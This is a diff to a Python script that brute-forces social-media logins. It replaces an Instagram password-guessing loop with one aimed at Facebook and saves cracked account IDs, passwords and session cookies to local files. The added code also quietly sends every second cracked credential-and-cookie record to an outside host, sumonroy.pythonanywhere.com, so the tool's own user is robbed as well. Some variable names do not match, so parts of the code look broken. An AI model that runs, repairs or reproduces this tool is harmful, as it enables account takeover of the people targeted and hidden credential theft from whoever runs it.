@@ -57,6 +57,13 @@ def menu():
         print(f"\n\033[1;91m Select valid option ....")
         time.sleep(3)
         menu()
+
+def check_lock(cid):
+    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
+    if 'Photoshop' in req:
+        return 'live'
+    else:
+        return 'lock'
 ###-------[DEF CLONING]-----------####
 def random_number():
     clear()
@@ -102,100 +109,95 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             session = requests.Session()
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
+            requu1 = session.get('https://free.facebook.com')
             data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': ids,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+            'bi_wvdp': '',
+            'fb_dtsg': '',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
+            '__dyn': '',
+            '__csr': '',
+            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
+            '__fmt': '0',
+            '__a': '',
+            '__user': '0'}
             headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
-            session_cookies = response.cookies.get_dict()
-            if response.status_code == 200:
-                json_response = response.json()
-                if json_response.get('status') == 'ok':
-                   if json_response.get('authenticated') == True:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
+            "Host":"m.facebook.com",
+            "Connection":"keep-alive",
+            "Upgrade-Insecure-Requests":"1",
+            "User-Agent":ugenX(),
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "dnt":"1",
+            "X-Requested-With":"mark.via.gp",
+            "Sec-Fetch-Site":"none",
+            "Sec-Fetch-Mode":"navigate",
+            "Sec-Fetch-User":"?1",
+            "Sec-Fetch-Dest":"document",
+            "dpr":"1.75",
+            "viewport-width":"980",
+            "sec-ch-ua":"\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
+            "sec-ch-ua-mobile":"?1",
+            "sec-ch-ua-platform":"\"Android\"",
+            "sec-ch-ua-platform-version":"\"\"",
+            "sec-ch-ua-model":"\"\"",
+            "sec-ch-ua-full-version-list":"",
+            "sec-ch-prefers-color-scheme":"dark",
+            "Accept-Encoding":"gzip, deflate, br, zstd",
+            "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
+            url = 'https://free.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif json_response.get('auth_token'):
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif 'sessionid' in session_cookies:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop+=1
-    except ConnectionError:
-        time.sleep(10)
-    except:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
         pass
 menu()
  
